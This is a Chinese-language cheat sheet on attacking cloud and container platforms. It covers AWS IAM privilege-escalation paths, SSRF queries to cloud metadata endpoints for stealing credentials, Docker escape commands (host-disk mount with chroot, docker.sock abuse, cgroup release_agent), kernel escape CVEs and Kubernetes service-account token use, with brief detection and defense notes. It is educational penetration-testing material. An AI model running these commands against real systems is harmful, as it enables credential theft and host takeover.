# 云与容器攻击

> **难度：** ★★★★☆ | **前置知识：** 云平台基础（AWS/Azure/GCP）、Docker/K8s 基础
> 
> 最后更新：2026-05-14

---

## AWS IAM 提权

### 9 种提权路径

| # | 方法 | 前提 | 利用 |
|---|------|------|------|
| 1 | iam:PassRole + lambda:CreateFunction | PassRole 权限 | 创建 Lambda 以目标角色执行 |
| 2 | iam:PassRole + ec2:RunInstances | PassRole 权限 | EC2 实例绑定目标角色 |
| 3 | iam:PassRole + glue:CreateDevEndpoint | PassRole 权限 | Glue DevEndpoint 绑定目标角色 |
| 4 | iam:CreateAccessKey | 目标用户有 access key | 创建其他用户的 access key |
| 5 | iam:CreateLoginProfile | 目标用户无登录配置 | 为用户创建密码登录 |
| 6 | iam:UpdateLoginProfile | 已有登录配置 | 修改用户密码 |
| 7 | iam:PutUserPolicy | 用户管理权限 | 为用户附加内联策略 |
| 8 | iam:AttachUserPolicy | 用户管理权限 | 附加管理员策略 |
| 9 | iam:CreatePolicyVersion | 策略管理权限 | 创建新版本策略设为默认 |

---

## SSRF → 云元数据攻击

```
SSRF → http://169.254.169.254/latest/meta-data/iam/security-credentials/
→ 获取临时凭证 → 枚举 S3/EC2/Lambda → 横向移动

AWS IMDSv1: GET http://169.254.169.254/latest/meta-data/
AWS IMDSv2: PUT http://169.254.169.254/latest/api/token (需 X-aws-ec2-metadata-token-ttl-seconds)
→ IMDSv2 需要 SSRF + PUT + 自定义 Header，防御更强

GCP: http://metadata.google.internal/computeMetadata/v1/
Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

---

## Docker 容器逃逸

### 5 种逃逸手法

**1. 特权容器逃逸：**
```bash
# 检查：cat /proc/1/status | grep CapEff
# CapEff: 0000003fffffffff = 特权容器
mount /dev/sda1 /mnt/host && chroot /mnt/host
```

**2. Docker Socket 挂载逃逸：**
```bash
# /var/run/docker.sock 挂载到容器内
docker run -it --privileged -v /:/host alpine chroot /host
```

**3. Kernel 漏洞逃逸：**
| CVE | 内核版本 | 利用 |
|-----|----------|------|
| CVE-2022-0185 | < 5.16.2 | heap overflow |
| CVE-2022-0492 | < 5.17 | cgroup release_agent |
| CVE-2024-1086 | 3.15-6.7.1 | nf_tables UAF |
| CVE-2024-21625 | < 6.8 | runc 逃逸 |

**4. Cgroup Release Agent：**
```bash
echo 1 > /tmp/escape/notify_on_release
echo "$host_path/cmd" > /tmp/escape/release_agent
```

**5. Procfs/Sysfs 逃逸：**
- 通过 `/proc/pid/ns` 获取宿主机 namespace
- 利用 `/sys/kernel/debug` 信息泄露

---

## Kubernetes 攻击

**Service Account Token 利用：**
```bash
token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -k -H "Authorization: Bearer $token" https://kubernetes.default.svc/api/v1/
```

**RBAC 绕过：**
- 有 list secrets 权限 → 获取所有 Secret
- 有 create pods 权限 → 创建挂载宿主机目录的 Pod

**检测：** 监控特权容器创建、Docker socket 挂载、异常 `nsenter`/`chroot` 调用

**防御：** 禁止特权容器、限制 SA 权限（automountServiceAccountToken: false）、Falco 运行时监控

---

## Azure / GCP 攻击

**Azure 常见攻击：**
- Managed Identity 滥用
- Azure AD Connect 攻击（获取域管凭证）
- Azure Key Vault 访问
- Azure DevOps 管道攻击

**GCP 常见攻击：**
- 元数据服务利用
- Service Account 密钥泄露
- GKE RBAC 绕过
- Cloud Functions 触发器劫持

---

_→ 参见 [`defense/cloud-defense.md`](../defense/cloud-defense.md) 获取云安全加固_
_→ 参见 [`tools/nmap-masscan.md`](../tools/nmap-masscan.md) 获取网络扫描_

---

## 📎 相关主题

- **防御：** [defense/cloud-defense.md](../defense/cloud-defense.md) — 云安全加固
- **Web 攻击：** [ttacks/web-attacks.md](web-attacks.md) — SSRF 详细利用
- **工具：** [	ools/nmap-masscan.md](../tools/nmap-masscan.md) — 云环境网络扫描
